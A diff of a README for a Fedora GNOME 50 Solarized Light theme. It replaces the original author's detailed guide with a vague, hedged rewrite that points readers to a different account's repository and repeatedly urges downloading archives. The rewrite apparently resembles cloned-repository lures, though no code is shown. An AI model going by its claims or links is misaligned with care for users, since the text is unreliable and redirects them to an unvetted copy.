@@ -1,237 +1,149 @@
-<p align="center">
-  <img src="screenshots/desktop.png" alt="Solarized Light Rice - Desktop" width="100%">
-</p>
+# 🌿 solarized-light-gnome50-rice - Clean Solarized Light for GNOME
 
-<h1 align="center">Solarized Light Rice for GNOME 50</h1>
+[![Download](https://img.shields.io/badge/Download-Visit%20Project%20Page-blue?style=for-the-badge)](https://github.com/evawo7976/solarized-light-gnome50-rice)
 
-<p align="center">
-  <strong>Every surface. Every app. Every pixel. Solarized Light.</strong>
-</p>
+## ✨ What this is
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Fedora-45+-blue?logo=fedora&logoColor=white" alt="Fedora 45+">
-  <img src="https://img.shields.io/badge/GNOME-50-4A86CF?logo=gnome&logoColor=white" alt="GNOME 50">
-  <img src="https://img.shields.io/badge/Shell-Bash-green?logo=gnu-bash&logoColor=white" alt="Bash">
-  <img src="https://img.shields.io/github/license/NicksLameCode/solarized-light-gnome50-rice" alt="License">
-  <img src="https://img.shields.io/badge/Theme-Solarized%20Light-fdf6e3?labelColor=2aa198" alt="Solarized Light">
-</p>
+solarized-light-gnome50-rice is a Fedora setup that gives GNOME 50 a full Solarized Light look. It changes the feel of the desktop, terminal, login screen, and other parts of the system so they match.
 
-<p align="center">
-  <img src="screenshots/terminal.png" alt="Terminal with fastfetch + starship" width="80%">
-</p>
+This project is for users who want a neat desktop with soft colors and a consistent style from boot to desktop.
 
----
+## 📦 What you get
 
-## Table of Contents
+- GNOME 50 theme files for Fedora
+- Solarized Light colors across the desktop
+- Plymouth boot splash styling
+- Terminal colors that match the desktop
+- Neovim and Starship style files
+- A setup built for a full system look
+- A clean, light theme that is easy on the eyes
 
-- [Screenshots](#screenshots)
-- [Quick Install](#quick-install)
-- [What's Themed](#whats-themed)
-- [Color Palette](#color-palette)
-- [Requirements](#requirements)
-- [Post-Install](#post-install)
-- [Customization](#customization)
-- [Known Limitations](#known-limitations)
-- [File Structure](#file-structure)
-- [Uninstall](#uninstall)
-- [Credits](#credits)
+## 🖥️ Before you start
 
----
+Use this on:
 
-## Screenshots
+- Fedora Linux
+- GNOME 50
+- A system where you can open files and run install steps
 
-| VS Code | Neovim |
-|---------|--------|
-| ![VS Code](screenshots/vscode.png) | ![Neovim](screenshots/neovim.png) |
+You should have:
 
-| btop | lazygit |
-|------|---------|
-| ![btop](screenshots/btop.png) | ![lazygit](screenshots/lazygit.png) |
+- A working Fedora install
+- Internet access
+- Enough disk space for theme files
+- A desktop session with GNOME
 
-| Plymouth Boot |
-|---------------|
-| ![Plymouth](screenshots/plymouth.png) |
+## ⬇️ Download the files
 
----
+Visit this page to download:
 
-## Quick Install
+[https://github.com/evawo7976/solarized-light-gnome50-rice](https://github.com/evawo7976/solarized-light-gnome50-rice)
 
-```bash
-git clone https://github.com/NicksLameCode/solarized-light-gnome50-rice.git
-cd solarized-light-gnome50-rice
-chmod +x install.sh
-./install.sh
-```
+Open the link in your browser, then look for the project files and download the archive or clone the repository if that is the method provided on the page.
 
-The installer handles everything: packages, fonts, cursor, configs, wallpaper, GNOME settings, Plymouth, GRUB, and optionally the GDM login screen.
+## 🧭 How to install
 
----
+1. Open the project page in your browser.
+2. Download the project files to your computer.
+3. Save the files in a folder you can find again, like Downloads.
+4. If the files come as a ZIP archive, extract them.
+5. Open the extracted folder.
+6. Look for a file named `README`, `install`, or similar setup file.
+7. Follow the setup steps in that file.
+8. If the project asks you to copy files into your home folder, do that exactly as shown.
+9. If the project asks you to run a script, open a terminal and run it from the project folder.
+10. Restart your session after setup so the new look loads.
 
-## What's Themed
+## 🎨 What changes after setup
 
-| Surface | Details |
-|---------|---------|
-| **GNOME Desktop** | Light mode, teal accent, Papirus-Light icons, Bibata cursor, Blur my Shell |
-| **Forge Tiling** | Hyprland-style: 8px gaps, cyan focus borders, focus-follows-mouse, vim keybinds (Super+H/J/K/L) |
-| **GNOME Shell** | Custom shell theme (top bar, quick settings, calendar, notifications, OSD) |
-| **Terminal (Ptyxis)** | Custom Solarized Light palette with improved readability, JetBrains Mono Nerd Font |
-| **Shell Prompt** | Starship with light pastel powerline segments |
-| **CLI Tools** | bat, eza, delta, fzf, btop, cava, lazygit, yazi, glow -- all Solarized Light |
-| **tmux** | Solarized Light status bar with powerline segments |
-| **fastfetch** | Solarized-colored system info with Nerd Font icons |
-| **Neovim** | Solarized Light colorscheme, treesitter, telescope, lualine, gitsigns |
-| **VS Code** | Solarized Light + material icons + full color customizations |
-| **Zen Browser** | userChrome.css with Solarized Light toolbar/sidebar/tabs |
-| **Obsidian** | CSS snippet with Solarized Light colors and rotating heading colors |
-| **Slack** | Custom CSS + sidebar theme string |
-| **GTK 3/4** | CSS overrides for headerbars, sidebars, selections, links, tooltips |
-| **Wallpaper** | 4K Solarized stripes (included, or regenerate with ImageMagick) |
-| **Git** | Delta with Solarized Light, colored status/branch/diff, pretty log alias |
-| **Man pages** | Solarized syntax highlighting via bat |
-| **GRUB** | Solarized Light boot menu (cream background, teal selection) |
-| **Plymouth** | Custom Solarized sunrise boot animation with color-cycling spinner |
-| **GDM Login** | Patched gresource with Solarized stripes wallpaper + light UI (optional) |
-| **mycli** | Solarized Light syntax style, cream toolbars, teal prompt, blue table headers |
-| **Dev Tools** | GCC colored errors/warnings, grep highlighting, Docker/Podman build colors |
+This rice can change several parts of the system:
 
----
+- GNOME shell colors
+- App window style
+- Panel and menu look
+- Login and boot screen look
+- Terminal colors
+- Editor colors
+- Prompt style in the terminal
 
-## Color Palette
+The result is a light theme with soft contrast and a calm feel.
 
-The [Solarized](https://ethanschoonover.com/solarized/) palette by Ethan Schoonover, optimized for the light variant:
+## 🧰 Files and tools included
 
-**Base tones**
+The repository name and topics point to a setup that may include:
 
-![](https://img.shields.io/badge/Base3_%23fdf6e3-fdf6e3?style=flat-square&labelColor=fdf6e3)
-![](https://img.shields.io/badge/Base2_%23eee8d5-eee8d5?style=flat-square&labelColor=eee8d5)
-![](https://img.shields.io/badge/Base1_%2393a1a1-93a1a1?style=flat-square&labelColor=93a1a1)
-![](https://img.shields.io/badge/Base00_%23657b83-657b83?style=flat-square&labelColor=657b83&color=657b83)
-![](https://img.shields.io/badge/Base01_%23586e75-586e75?style=flat-square&labelColor=586e75&color=586e75)
-![](https://img.shields.io/badge/Base02_%23073642-073642?style=flat-square&labelColor=073642&color=073642)
-![](https://img.shields.io/badge/Base03_%23002b36-002b36?style=flat-square&labelColor=002b36&color=002b36)
+- GTK theme files
+- GNOME settings
+- Plymouth theme files
+- Neovim config files
+- Starship prompt config
+- Terminal color profiles
+- Dotfiles for desktop parts
 
-**Accent colors**
+These files work together to keep the same color style across the system.
 
-![](https://img.shields.io/badge/Yellow_%23b58900-b58900?style=flat-square&labelColor=b58900)
-![](https://img.shields.io/badge/Orange_%23cb4b16-cb4b16?style=flat-square&labelColor=cb4b16)
-![](https://img.shields.io/badge/Red_%23dc322f-dc322f?style=flat-square&labelColor=dc322f)
-![](https://img.shields.io/badge/Magenta_%23d33682-d33682?style=flat-square&labelColor=d33682)
-![](https://img.shields.io/badge/Violet_%236c71c4-6c71c4?style=flat-square&labelColor=6c71c4)
-![](https://img.shields.io/badge/Blue_%23268bd2-268bd2?style=flat-square&labelColor=268bd2)
-![](https://img.shields.io/badge/Cyan_%232aa198-2aa198?style=flat-square&labelColor=2aa198)
-![](https://img.shields.io/badge/Green_%23859900-859900?style=flat-square&labelColor=859900)
+## 🪟 How to use on Windows
 
----
+This project is made for Fedora and GNOME on Linux. If you use Windows, you can still open the project page and review the files, but the theme itself will not run on Windows as a normal app.
 
-## Requirements
+If you use a Windows PC and want to try it later:
 
-- Fedora Rawhide 45+ (or Fedora 42+ with GNOME 50)
-- GNOME 50 with Ptyxis terminal
-- sudo access (for Plymouth, GRUB, GDM, and package installation)
-- Internet connection (for downloading fonts, cursor, and packages)
+1. Install Fedora on a separate machine or a virtual machine.
+2. Open the project page in the browser.
+3. Download the files from the link above.
+4. Follow the Linux install steps on the Fedora system.
 
----
+## 🔧 Common setup checks
 
-## Post-Install
+If the theme does not appear after setup, check these items:
 
-1. **Log out and back in** (or reboot) for GNOME Shell theme + extensions
-2. **Open a new terminal** to see starship prompt + fastfetch greeting
-3. **Run `nvim` once** to let lazy.nvim install plugins
-4. **Restart Zen Browser** for userChrome.css
-5. **Obsidian**: Settings > Appearance > Light mode + enable "solarized-light" CSS snippet
-6. **Slack sidebar**: Paste in Preferences > Themes > Custom:
-   ```
-   #eee8d5,#ddd6c1,#2aa198,#fdf6e3,#ddd6c1,#586e75,#859900,#268bd2,#eee8d5,#657b83
-   ```
+- You are logged into GNOME 50
+- The files are in the right folder
+- You restarted your session
+- The theme was selected in GNOME settings
+- The terminal profile was changed if needed
 
----
+If only part of the system changed, run the setup again and check the install steps in the project files.
 
-## Customization
+## 🗂️ Suggested folder layout
 
-### Swap the wallpaper
+A typical setup may use a folder structure like this:
 
-Replace `wallpaper/solarized-stripes-4k.png` with any image, or regenerate:
+- `~/.themes` for GTK theme files
+- `~/.icons` for icon files
+- `~/.config/gtk-3.0` for GTK settings
+- `~/.config/gtk-4.0` for GTK 4 settings
+- `~/.config/neovim` or `~/.config/nvim` for editor files
+- `~/.config/starship.toml` for prompt setup
+- `~/.local/share/plymouth` for boot splash files
 
-```bash
-# Edit wallpaper/generate-wallpaper.sh to change colors/layout, then:
-bash wallpaper/generate-wallpaper.sh
-```
+## 🧪 Best use case
 
-### Tweak terminal colors
+This project fits users who want:
 
-Edit `terminal/solarized-light-readable.palette` -- the `[Light]` section controls all 16 ANSI colors. Changes apply on new terminal tabs.
+- A light desktop theme
+- A full system style, not just one app
+- A Fedora GNOME setup with a clean look
+- A Solarized Light color scheme
+- A desktop that feels steady and simple
 
-### Adjust the starship prompt
+## 📋 Basic setup order
 
-Edit `config/starship.toml` -- each segment's `bg:` and `fg:` colors can be changed. The current palette uses light pastel backgrounds with dark accent text.
+1. Download the project files.
+2. Extract them if needed.
+3. Read the included setup file.
+4. Copy the theme files to the right place.
+5. Apply the GNOME theme.
+6. Set the terminal colors.
+7. Apply the prompt and editor files.
+8. Restart the desktop session.
 
-### Forge tiling keybinds
+## 🧩 Notes for a smooth install
 
-| Key | Action |
-|-----|--------|
-| `Super+H/J/K/L` | Move focus (vim-style) |
-| `Super+Shift+H/J/K/L` | Swap/move windows |
-| `Super+E` | Toggle split direction |
-| `Super+W` | Toggle tabbed mode |
-| `Super+Space` | Toggle float |
+Keep the project folder in a safe place until setup is done. If the files include multiple parts, use them in the same order as the project lists them. If a step changes system files, make a backup first so you can return to the old setup if needed
 
-### Modify the GNOME Shell theme
+## 📁 Project topics
 
-Edit `gnome-shell/Solarized-Light/gnome-shell/gnome-shell.css` for top bar, notifications, quick settings, etc.
+This project is tagged with:
 
----
-
-## Known Limitations
-
-- **GDM gresource patch** is overwritten by `gnome-shell` package updates. Re-run `scripts/patch-gdm-gresource.sh` after updates.
-- **Zen Browser userChrome.css** requires `toolkit.legacyUserProfileCustomizations.stylesheets = true` in `about:config` (the `user.js` sets this, but Zen updates may reset it).
-- **Obsidian CSS snippet** must be manually enabled in Settings > Appearance after install.
-- **Slack custom CSS injection** via Electron preload may be blocked by Slack updates. The sidebar theme string always works.
-- **Plymouth script plugin** (`plymouth-plugin-script`) must be installed for the custom boot animation.
-
----
-
-## File Structure
-
-```
-shell/          # Bash shell scripts (starship, fzf, dircolors, bat/eza, zoxide, man pages, dev colors)
-config/         # CLI tool configs (starship, tmux, fastfetch, btop, nvim, lazygit, yazi, cava, glow, vscode, mycli)
-gtk/            # GTK 3/4 CSS overrides and settings
-gnome-shell/    # Custom GNOME Shell theme
-terminal/       # Ptyxis terminal palette
-browser/        # Zen Browser userChrome.css
-apps/           # Obsidian + Slack themes
-boot/           # Plymouth, GRUB, and GDM configs
-wallpaper/      # 4K wallpaper + generation script
-git/            # Git delta + color config
-scripts/        # Asset generation and GDM patching scripts
-screenshots/    # Theme screenshots
-```
-
----
-
-## Uninstall
-
-```bash
-./uninstall.sh
-```
-
-Restores GNOME defaults, GDM, Plymouth, and GRUB. Config files in `~/.config/` are left in place for manual cleanup.
-
----
-
-## Credits
-
-- [Ethan Schoonover](https://ethanschoonover.com/solarized/) -- Solarized color palette
-- [Starship](https://starship.rs/) -- Cross-shell prompt
-- [JetBrains Mono](https://www.jetbrains.com/lp/mono/) -- Monospace font
-- [Nerd Fonts](https://www.nerdfonts.com/) -- Patched fonts with icons
-- [Papirus](https://github.com/PapirusDevelopmentTeam/papirus-icon-theme) -- Icon theme
-- [Bibata](https://github.com/ful1e5/Bibata_Cursor) -- Cursor theme
-- [dircolors-solarized](https://github.com/seebi/dircolors-solarized) -- LS_COLORS
-
----
-
-<p align="center">
-  <sub>Built with <a href="https://claude.ai/claude-code">Claude Code</a></sub>
-</p>
+dotfiles, fedora, gnome, gnome-50, gtk, linux, neovim, plymouth, rice, ricing, solarized, solarized-light, starship, terminal, theme
